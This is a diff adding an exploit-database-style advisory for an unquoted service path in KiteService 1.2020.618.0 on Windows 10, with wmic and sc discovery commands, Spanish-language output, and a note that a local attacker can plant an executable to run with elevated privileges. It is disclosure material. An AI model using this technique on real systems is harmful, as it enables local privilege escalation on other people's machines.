@@ -1,0 +1,38 @@
+# Exploit Title: KiteService 1.2020.618.0 - Unquoted Service Path
+# Discovery by: PoisonSk
+# Discovery Date: 2020-06-23
+# Vendor Homepage: https://www.kite.com/
+# Software Link : https://www.kite.com/download/
+# Tested Version: 1.2020.618.0
+# Vulnerability Type: Unquoted Service Path
+# Tested on OS: Microsoft Windows 10 Home Single 10.0.18363 N/D Compilación 18363
+
+
+
+# Steps to discover unquoted Service Path: 
+
+C:\Users>wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i "program " | findstr /i /v """
+KiteService	KiteService	C:\Program Files\Kite\KiteService.exe	Auto
+
+
+
+
+C:\Users>sc qc KiteService
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: KiteService
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 0   IGNORE
+        NOMBRE_RUTA_BINARIO: C:\Program Files\Kite\KiteService.exe
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : KiteService
+        DEPENDENCIAS       :
+        NOMBRE_INICIO_SERVICIO: LocalSystem
+
+
+
+# Exploit:
+#A successful attempt would require the local attacker must insert an executable file in the path of the service. 
+#Upon service restart or system reboot, the malicious code will be run with elevated privileges.
